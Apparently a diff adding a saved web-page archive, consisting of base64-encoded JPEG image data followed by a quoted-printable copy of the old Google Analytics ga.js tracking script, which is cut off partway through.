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
+69zx06VYooAKKKKACiiigD//2Q==
+
+------=_NextPart_000_0000_01C8B5AD.98E80010
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://ssl.google-analytics.com/ga.js
+
+var _gat=3Dnew =
+Object({c:"length",p:"cookie",b:undefined,bb:function(d,a){this.wb=3Dd;th=
+is.Hb=3Da},o:"__utma=3D",W:"__utmb=3D",ma:"__utmc=3D",Ta:"__utmk=3D",na:"=
+__utmv=3D",oa:"__utmx=3D",Sa:"GASO=3D",X:"__utmz=3D",fc:"http://www.googl=
+e-analytics.com/__utm.gif",gc:"https://ssl.google-analytics.com/__utm.gif=
+",Wa:"utmcid=3D",Ya:"utmcsr=3D",$a:"utmgclid=3D",Ua:"utmccn=3D",Xa:"utmcm=
+d=3D",Za:"utmctr=3D",Va:"utmcct=3D",Db:false,_gasoDomain:undefined,_gasoC=
+Path:undefined,t:function(d){var =
+a=3D1,c=3D0,h,o;if(!_gat.m(d)){a=3D0;for(h=3Dd[_gat.c]-1;h>=3D=0A=
+0;h--){o=3Dd.charCodeAt(h);a=3D(a<<6&268435455)+o+(o<<14);c=3Da&266338304=
+;a=3Dc!=3D0?a^c>>21:a}}return a},B:function(d,a,c){var =
+h=3D_gat,o=3D"-",j,m,r=3Dh.m;if(!r(d)&&!r(a)&&!r(c)){j=3Dh.v(d,a);if(j>-1=
+){m=3Dd.indexOf(c,j);if(m<0)m=3Dd[h.c];o=3Dh.D(d,j+h.v(a,"=3D")+1,m)}}ret=
+urn o},Ea:function(d){var =
+a=3Dfalse,c=3D0,h,o;if(!_gat.m(d)){a=3Dtrue;for(h=3D0;h<d[_gat.c];h++){o=3D=
+d.charAt(h);c+=3D"."=3D=3Do?1:0;a=3Da&&c<=3D1&&(0=3D=3Dh&&"-"=3D=3Do||_ga=
+t.O(".0123456789",o))}}return a},d:function(d,a){var =
+c=3DencodeURIComponent;return c instanceof Function?(a?encodeURI(d):=0A=
+c(d)):escape(d)},z:function(d,a){var =
+c=3DdecodeURIComponent,h;d=3Dd.split("+").join(" ");if(c instanceof =
+Function)try{h=3Da?decodeURI(d):c(d)}catch(o){h=3Dunescape(d)}else =
+h=3Dunescape(d);return h},Ab:function(d){return =
+d&&d.hash?_gat.D(d.href,_gat.v(d.href,"#")):""},m:function(d){return =
+_gat.b=3D=3Dd||"-"=3D=3Dd||""=3D=3Dd},Fb:function(d){return =
+d[_gat.c]>0&&_gat.O(" \n\r\t",d)},O:function(d,a){return =
+_gat.v(d,a)>-1},g:function(d,a){d[d[_gat.c]]=3Da},S:function(d){return =
+d.toLowerCase()},w:function(d,a){return d.split(a)},=0A=
+v:function(d,a){return =
+d.indexOf(a)},D:function(d,a,c){c=3D_gat.b=3D=3Dc?d[_gat.c]:c;return =
+d.substring(a,c)},mc:function(){var =
+d=3D_gat.b,a=3Dwindow;if(a&&a.gaGlobal&&a.gaGlobal.hid)d=3Da.gaGlobal.hid=
+;else{d=3DMath.round(Math.random()*2147483647);a.gaGlobal=3Da.gaGlobal?a.=
+gaGlobal:{};a.gaGlobal.hid=3Dd}return d},wa:function(){return =
+Math.round(Math.random()*2147483647)}});_gat.bc=3Dfunction(){var =
+d=3Dthis,a=3D_gat.bb;function c(h,o){return new =
+a(h,o)}d.cb=3D"utm_campaign";d.db=3D"utm_content";d.eb=3D"utm_id";d.fb=3D=
+"utm_medium";d.gb=3D"utm_nooverride";d.hb=3D"utm_source";d.ib=3D"utm_term=
+";d.jb=3D"gclid";d.pa=3D0;d.H=3D0;d.ub=3D"15768000";d.Nb=3D"1800";d.ea=3D=
+[];d.ga=3D[];d.fa=3D[c("google","q"),c("yahoo","p"),c("msn","q"),c("aol",=
+"query"),c("aol","encquery"),c("lycos","query"),c("ask","q"),c("altavista=
+","q"),c("netscape","query"),c("cnn","query"),c("looksmart","qt"),c("abou=
+t","terms"),c("mamma","query"),=0A=
+c("alltheweb","q"),c("gigablast","q"),c("voila","rdata"),c("virgilio","qs=
+"),c("live","q"),c("baidu","wd"),c("alice","qs"),c("yandex","text"),c("na=
+jdi","q"),c("aol","q"),c("club-internet","query"),c("mama","query"),c("se=
+znam","q"),c("search","q"),c("wp","szukaj"),c("onet","qt"),c("netsprint",=
+"q"),c("google.interia","q"),c("szukacz","q"),c("yam","k"),c("pchome","q"=
+),c("kvasir","searchExpr"),c("sesam","q"),c("ozu","q"),c("terra","query")=
+,c("nostrum","query"),c("mynet","q"),c("ekolay","q")];d.J=3D[];d.l=3D=0A=
+"/";d.ha=3D100;d.Da=3D"/__utm.gif";d.ta=3D1;d.ua=3D1;d.F=3D"|";d.sa=3D1;d=
+.qa=3D1;d.nb=3D1;d.f=3D"auto";d.C=3D1;d.Ga=3D1000;d.Mc=3D10;d.hc=3D10;d.N=
+c=3D0.2};_gat.Y=3Dfunction(d,a){var =
+c,h,o,j,m,r,p,f=3Dthis,n=3D_gat,t=3Dn.m,y=3Dn.c,g,B=3Da;f.a=3Dd;function =
+q(k){var b=3Dk instanceof Array?k.join("."):"";return =
+t(b)?"-":b}function u(k,b){var =
+e=3D[],i;if(!t(k)){e=3Dn.w(k,".");if(b)for(i=3D0;i<e[y];i++)if(!n.Ea(e[i]=
+))e[i]=3D"-"}return e}function x(){return z(63072000000)}function =
+z(k){var b=3Dnew Date,e=3Dnew =
+Date(b.getTime()+k);return"expires=3D"+e.toGMTString()+"; "}function =
+l(k,b){f.a[n.p]=3Dk+"; path=3D"+B.l+"; "+b+f.sc()}function v(k,b,e){var =
+i=3Df.U,s;for(s=3D0;s<i[y];s++)i[s][2](n.B(k,=0A=
+i[s][0]+b,e))}f.Eb=3Dfunction(){return =
+n.b=3D=3Dg||g=3D=3Df.t()};f.Ba=3Dfunction(){return =
+m?m:"-"};f.Qb=3Dfunction(k){m=3Dk};f.Ma=3Dfunction(k){g=3Dn.Ea(k)?k*1:"-"=
+};f.Aa=3Dfunction(){return =
+q(r)};f.Na=3Dfunction(k){r=3Du(k)};f.wc=3Dfunction(){return =
+g?g:"-"};f.sc=3Dfunction(){return =
+t(B.f)?"":"domain=3D"+B.f+";"};f.ya=3Dfunction(){return =
+q(c)};f.Ob=3Dfunction(k){c=3Du(k,1)};f.I=3Dfunction(){return =
+q(h)};f.La=3Dfunction(k){h=3Du(k,1)};f.za=3Dfunction(){return =
+q(o)};f.Pb=3Dfunction(k){o=3Du(k,1)};f.Ca=3Dfunction(){return =
+q(j)};f.Rb=3Dfunction(k){j=3Du(k);=0A=
+for(var =
+b=3D0;b<j[y];b++)if(b<4&&!n.Ea(j[b]))j[b]=3D"-"};f.tc=3Dfunction(){return=
+ =
+p};f.Ic=3Dfunction(k){p=3Dk};f.ic=3Dfunction(){c=3D[];h=3D[];o=3D[];j=3D[=
+];m=3Dn.b;r=3D[];g=3Dn.b};f.t=3Dfunction(){var =
+k=3D"",b;for(b=3D0;b<f.U[y];b++)k+=3Df.U[b][1]();return =
+n.t(k)};f.Ha=3Dfunction(k){var =
+b=3Df.a[n.p],e=3Dfalse;if(b){v(b,k,";");f.Ma(f.t());e=3Dtrue}return =
+e};f.Ec=3Dfunction(k){v(k,"","&");f.Ma(n.B(k,n.Ta,"&"))};f.Kc=3Dfunction(=
+){var =
+k=3Df.U,b=3D[],e;for(e=3D0;e<k[y];e++)n.g(b,k[e][0]+k[e][1]());n.g(b,n.Ta=
++f.t());return b.join("&")};f.Pc=3Dfunction(k,=0A=
+b){var =
+e=3Df.U,i=3DB.l,s;f.Ha(k);B.l=3Db;for(s=3D0;s<e[y];s++)if(!t(e[s][1]()))e=
+[s][3]();B.l=3Di};f.Yb=3Dfunction(){l(n.o+f.ya(),x())};f.Pa=3Dfunction(){=
+l(n.W+f.I(),z(B.Nb*1000))};f.Zb=3Dfunction(){l(n.ma+f.za(),"")};f.Ra=3Dfu=
+nction(){l(n.X+f.Ca(),z(B.ub*1000))};f.$b=3Dfunction(){l(n.oa+f.Ba(),x())=
+};f.Qa=3Dfunction(){l(n.na+f.Aa(),x())};f.Qc=3Dfunction(){l(n.Sa+f.tc(),"=
+")};f.U=3D[[n.o,f.ya,f.Ob,f.Yb],[n.W,f.I,f.La,f.Pa],[n.ma,f.za,f.Pb,f.Zb]=
+,[n.oa,f.Ba,f.Qb,f.$b],[n.X,f.Ca,f.Rb,f.Ra],[n.na,f.Aa,f.Na,f.Qa]]};_gat.=
+dc=3Dfunction(d){var =
+a=3Dthis,c=3D_gat,h=3Dd,o,j=3Dfunction(){},m=3Dfunction(r){var p=3D(new =
+Date).getTime(),f;f=3D(p-r[3])*(h.Nc/1000);if(f>=3D1){r[2]=3DMath.min(Mat=
+h.floor(r[2]*1+f),h.hc);r[3]=3Dp}return =
+r};a.N=3Dfunction(r,p,f,n,t,y){var =
+g,B=3Dh.C,q=3Df.location;if(!o)o=3Dnew =
+c.Y(f,h);o.Ha(n);g=3Dc.w(o.I(),".");if(g[1]<500||t){if(y)g=3Dm(g);if(t||!=
+y||g[2]>=3D1){if(!t&&y)g[2]=3Dg[2]*1-1;g[1]=3Dg[1]*1+1;r=3D"?utmwv=3D4.1&=
+utmn=3D"+c.wa()+(c.m(q.hostname)?"":"&utmhn=3D"+c.d(q.hostname))+(h.ha=3D=
+=3D100?"":"&utmsp=3D"+c.d(h.ha))+r;if(0=3D=3DB||2=3D=3DB){var u=3D=0A=
+new =
+Image(1,1);u.src=3Dh.Da+r;u.onload=3Dfunction(){j()}}if(1=3D=3DB||2=3D=3D=
+B){var x=3Dnew =
+Image(1,1);x.src=3D("https:"=3D=3Dq.protocol?c.gc:c.fc)+r+"&utmac=3D"+p+"=
+&utmcc=3D"+a.nc(f,n);x.onload=3Dfunction(){j()}}}}o.La(g.join("."));o.Pa(=
+)};a.nc=3Dfunction(r,p){var =
+f=3D[],n=3D[c.o,c.X,c.na,c.oa],t,y=3Dr[c.p],g;for(t=3D0;t<n[c.c];t++){g=3D=
+c.B(y,n[t]+p,";");if(!c.m(g))c.g(f,n[t]+g+";")}return =
+c.d(f.join("+"))}};_gat.h=3Dfunction(){this.la=3D[]};_gat.h.ab=3Dfunction=
+(d,a,c,h,o,j){var =
+m=3Dthis;m.Xb=3Dd;m.Oa=3Da;m.K=3Dc;m.qb=3Dh;m.Jb=3Do;m.Kb=3Dj};_gat.h.ab.=
+prototype.R=3Dfunction(){var =
+d=3Dthis,a=3D_gat.d;return"&"+["utmt=3Ditem","utmtid=3D"+a(d.Xb),"utmipc=3D=
+"+a(d.Oa),"utmipn=3D"+a(d.K),"utmiva=3D"+a(d.qb),"utmipr=3D"+a(d.Jb),"utm=
+iqt=3D"+a(d.Kb)].join("&")};_gat.h.$=3Dfunction(d,a,c,h,o,j,m,r){var =
+p=3Dthis;p.u=3Dd;p.mb=3Da;p.Wb=3Dc;p.Vb=3Dh;p.Sb=3Do;p.sb=3Dj;p.Ub=3Dm;p.=
+vb=3Dr;p.ca=3D[]};_gat.h.$.prototype.kb=3Dfunction(d,a,c,h,o){var =
+j=3Dthis,m=3Dj.Bb(d),r=3Dj.u,p=3D_gat;if(p.b=3D=3D=0A=
+m)p.g(j.ca,new =
+p.h.ab(r,d,a,c,h,o));else{m.Xb=3Dr;m.Oa=3Dd;m.K=3Da;m.qb=3Dc;m.Jb=3Dh;m.K=
+b=3Do}};_gat.h.$.prototype.Bb=3Dfunction(d){var =
+a,c=3Dthis.ca,h;for(h=3D0;h<c[_gat.c];h++)a=3Dd=3D=3Dc[h].Oa?c[h]:a;retur=
+n a};_gat.h.$.prototype.R=3Dfunction(){var =
+d=3Dthis,a=3D_gat.d;return"&"+["utmt=3Dtran","utmtid=3D"+a(d.u),"utmtst=3D=
+"+a(d.mb),"utmtto=3D"+a(d.Wb),"utmttx=3D"+a(d.Vb),"utmtsp=3D"+a(d.Sb),"ut=
+mtci=3D"+a(d.sb),"utmtrg=3D"+a(d.Ub),"utmtco=3D"+a(d.vb)].join("&")};_gat=
+.h.prototype.lb=3Dfunction(d,a,c,h,o,j,m,r){var =
+p=3Dthis,f=3D_gat,n=3Dp.xa(d);if(f.b=3D=3D=0A=
+n){n=3Dnew =
+f.h.$(d,a,c,h,o,j,m,r);f.g(p.la,n)}else{n.mb=3Da;n.Wb=3Dc;n.Vb=3Dh;n.Sb=3D=
+o;n.sb=3Dj;n.Ub=3Dm;n.vb=3Dr}return =
+n};_gat.h.prototype.xa=3Dfunction(d){var =
+a,c=3Dthis.la,h;for(h=3D0;h<c[_gat.c];h++)a=3Dd=3D=3Dc[h].u?c[h]:a;return=
+ a};_gat.ac=3Dfunction(d){var =
+a=3Dthis,c=3D"-",h=3D_gat,o=3Dd;a.Ja=3Dscreen;a.ob=3D!self.screen&&self.j=
+ava?java.awt.Toolkit.getDefaultToolkit():h.b;a.a=3Ddocument;a.V=3Dwindow;=
+a.n=3Dnavigator;a.Ka=3Dc;a.Mb=3Dc;a.rb=3Dc;a.Ib=3Dc;a.Gb=3D1;a.yb=3Dc;fun=
+ction j(){var =
+m,r,p,f,n=3D"ShockwaveFlash",t=3D"$version",y=3Da.n?a.n.plugins:h.b;if(y&=
+&y[h.c]>0)for(m=3D0;m<y[h.c]&&!p;m++){r=3Dy[m];if(h.O(r.name,"Shockwave =
+Flash"))p=3Dh.w(r.description,"Shockwave Flash =
+")[1]}else{n=3Dn+"."+n;try{f=3Dnew =
+ActiveXObject(n+".7");p=3Df.GetVariable(t)}catch(g){}if(!p)try{f=3D=0A=
+new ActiveXObject(n+".6");p=3D"WIN =
+6,0,21,0";f.AllowScriptAccess=3D"always";p=3Df.GetVariable(t)}catch(B){}i=
+f(!p)try{f=3Dnew =
